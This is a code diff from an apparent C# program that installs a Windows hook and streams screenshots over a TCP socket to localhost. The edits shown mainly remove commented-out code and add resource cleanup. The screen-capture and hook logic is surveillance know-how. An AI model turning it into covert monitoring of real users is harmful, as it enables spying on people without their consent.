@@ -13,12 +13,7 @@ class Program
 {
     static void Main(string[] args)
     {
-
         WinAPIModule.hookId = WinAPIModule.SetHook(WinAPIModule.HookCallback);
-        //while(true)
-        //{
-
-        //}
 
         TcpClient Client = new TcpClient("localhost", 8888);
         NetworkStream Stream = Client.GetStream();
@@ -46,12 +41,6 @@ class Program
                 Screenshot.Save(BmpStream, codecInfo, EncoderParameters);
                 BmpStream.Seek(0, SeekOrigin.Begin);
 
-                //using (FileStream fileStream = new FileStream("example.bin", FileMode.Create))
-                //{
-                //    BmpStream.CopyTo(fileStream);
-                //    BmpStream.Flush();
-                //}
-
                 long BmpSize = BmpStream.Length;
                 byte[] ImgSize = BitConverter.GetBytes(BmpSize);
 
@@ -68,8 +57,11 @@ class Program
 
         //UnhookWindowsHookEx(hookId);
 
-        // Закрываем поток и клиентский сокет
+        Writer.Dispose();
+        Writer.Close();
+        Stream.Dispose();
         Stream.Close();
+        Client.Dispose();
         Client.Close();
     }
 
@@ -107,6 +99,9 @@ class WinAPIModule
 
     [DllImport("gdi32.dll")]
     static extern bool DeleteDC(IntPtr hdc);
+
+    [DllImport("gdi32.dll")]
+    public static extern bool DeleteObject(IntPtr hObject);
 
     [DllImport("user32.dll")]
     static extern bool ReleaseDC(IntPtr hwnd, IntPtr hdc);
@@ -161,6 +156,7 @@ class WinAPIModule
         Bitmap Screenshot = Image.FromHbitmap(hBitmap);
         SelectObject(hdcDest, hOld);
         DeleteDC(hdcDest);
+        DeleteObject(hBitmap);
         ReleaseDC(hwnd, hdcSrc);
         return Screenshot;
     }
